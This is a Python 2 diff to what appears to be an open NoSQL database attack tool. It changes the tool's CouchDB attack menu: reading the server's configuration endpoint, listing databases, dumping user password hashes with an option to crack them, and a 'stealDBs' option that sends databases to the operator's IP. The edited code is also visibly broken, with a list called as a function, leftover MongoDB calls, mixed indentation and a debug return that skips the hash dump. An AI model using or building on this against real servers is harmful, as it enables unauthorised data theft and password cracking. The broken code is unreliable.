@@ -61,7 +61,7 @@ def couchScan(target,port,pingIt):
             return [3,None]
         
         
-def netAttacks(target,port):
+def netAttacks(target,port, myIP):
     print "DB Access attacks (CouchDB)"
     print "======================"
     mgtOpen = False
@@ -125,7 +125,7 @@ def netAttacks(target,port):
 
             if attack == "1":
                 print "\n"
-                getPlatInfo(conn)
+                getPlatInfo(conn,target)
                 
             if attack == "2":
                 print "\n"
@@ -143,16 +143,16 @@ def netAttacks(target,port):
                     print "\n"
                     stealDBs(myIP,conn)
 
-            if attack == "6":
+            if attack == "5":
                     return
                 
-def getPlatInfo(couchConn):
-    	print "Server Info:"
-        print "CouchDB Version: " + couchConn.version()
-        print "Configuration File:\n"
-        print str(urllib.urlopen("http://" + target + ":5984/_config"))
-        print "\n"
-        return
+def getPlatInfo(couchConn, target):
+    print "Server Info:"
+    print "CouchDB Version: " + couchConn.version()
+    print "Configuration File:\n"
+    print urllib.urlopen("http://" + target + ":5984/_config").read()
+    print "\n"
+    return
     
 def enumDbs (couchConn):
     global dbList
@@ -162,20 +162,14 @@ def enumDbs (couchConn):
                  dbList.append(db)
                  
             print "List of databases:"
-            print "\n".join(mongoConn.database_names())
+            print "\n".join(dbList)
             print "\n"
+            return #debug
             
     except:
             print "Error:  Couldn't list databases.  The provided credentials may not have rights."
 
-    try:
-            for dbItem in mongoConn.database_names():
-                db = mongoConn[dbItem]
-                print dbItem + ":"
-                print "\n".join(db.collection_names())
-                print "\n"
-
-		if 'system.users' in db.collection_names():
+    if '_users' in dbList():
 		    users = list(db.system.users.find())
                     print "Database Users and Password Hashes:"
 
@@ -187,10 +181,5 @@ def enumDbs (couchConn):
 
 			if crack in yes_tag:
 			    passCrack(users[x]['user'],users[x]['pwd'])
-
-    except:
-        print "Error:  Couldn't list collections.  The provided credentials may not have rights."
-
-	print "\n"
-	return
+    return
 
